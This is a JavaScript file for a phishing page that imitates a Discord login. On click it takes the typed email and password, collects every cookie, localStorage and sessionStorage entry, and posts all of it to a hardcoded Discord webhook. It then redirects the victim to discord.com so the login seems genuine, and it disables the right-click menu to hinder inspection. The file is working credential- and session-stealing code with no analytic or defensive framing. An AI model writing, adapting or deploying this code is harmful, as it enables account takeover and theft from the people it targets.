// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const emailInput = document.querySelector('input[type="text"]'); // Assuming email/phone input is type="text"
const passwordInput = document.querySelector('input[type="password"]');

// Debug log to check if inputs are found
console.log("Script loaded. Email input:", emailInput);
console.log("Password input:", passwordInput);

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                              <span class="inner pulsingEllipsis">
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                                  <span class="item spinnerItem"></span>
                              </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  setTimeout(removeEllipsisAnimation, 3000);
}

// --------------------------------------------------
// ---------- GENERATING QRCODE ---------------------
// --------------------------------------------------
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
    }
    return svgElement;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// --------------------------------------------------
// ---------- FETCH ACCOUNT TOKEN -------------------
// --------------------------------------------------
async function fetchAccountToken(email, password) {
  const apiUrl = "https://api.example.com/login"; // Replace with your actual authentication API endpoint
  const payload = {
    email: email,
    password: password
  };

  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${await response.text()}`);
    }

    const data = await response.json();
    const token = data.token; // Adjust based on your API's response structure
    console.log("Token retrieved:", token);

    // Optionally generate QR code with the token
    const qrCode = generateQRCode(token);
    if (qrCode) {
      // Append QR code to the DOM or handle as needed
      document.body.appendChild(qrCode); // Example: Append to body
    }

    return token;
  } catch (error) {
    console.error("Error fetching token:", error.message);
    return null;
  }
}

// --------------------------------------------------
// ---------- COLLECT USER TOKENS -------------------
// --------------------------------------------------
function collectUserTokens() {
  let tokens = {};

  // Get cookies
  const cookies = document.cookie.split(";").reduce((acc, cookie) => {
    const [key, value] = cookie.trim().split("=");
    acc[key] = value;
    return acc;
  }, {});
  tokens.cookies = cookies;

  // Get localStorage
  const localStorageTokens = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageTokens[key] = localStorage.getItem(key);
  }
  tokens.localStorage = localStorageTokens;

  // Get sessionStorage
  const sessionStorageTokens = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionStorageTokens[key] = sessionStorage.getItem(key);
  }
  tokens.sessionStorage = sessionStorageTokens;

  return tokens;
}

// --------------------------------------------------
// ---------- WEBHOOK FUNCTION ----------------------
// --------------------------------------------------
async function sendToWebhook(email, password, token = null) {
  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with real URL
  const userTokens = collectUserTokens();
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nToken: ${token || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
    username: "Login Attempt",
    avatar_url: "https://example.com/avatar.png"
  };

  console.log("Attempting to send payload:", payload);

  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }

    console.log("Webhook success! Response:", responseText);
    return true;
  } catch (error) {
    console.error("Webhook failed:", error.message);
    alert("There was an error sending the webhook. Check the console.");
    return false;
  }
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", async () => {
  const email = emailInput ? emailInput.value.trim() : "";
  const password = passwordInput ? passwordInput.value.trim() : "";

  console.log("Email:", email, "Password:", password);

  if (!email || !password) {
    alert("Please enter both email and password!");
    return;
  }

  // Start animation
  animateEllipsis();

  // Fetch token
  const token = await fetchAccountToken(email, password);

  // Send to webhook with token and collected user tokens
  const webhookSuccess = await sendToWebhook(email, password, token);

  // After animation (3s), redirect if success
  setTimeout(() => {
    if (webhookSuccess) {
      console.log("Redirecting to Discord...");
      window.location.href = "https://discord.com/channels/@me";
    } else {
      console.log("Webhook failed - no redirect");
      alert("Login failed - check console for details");
    }
  }, 3000);
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
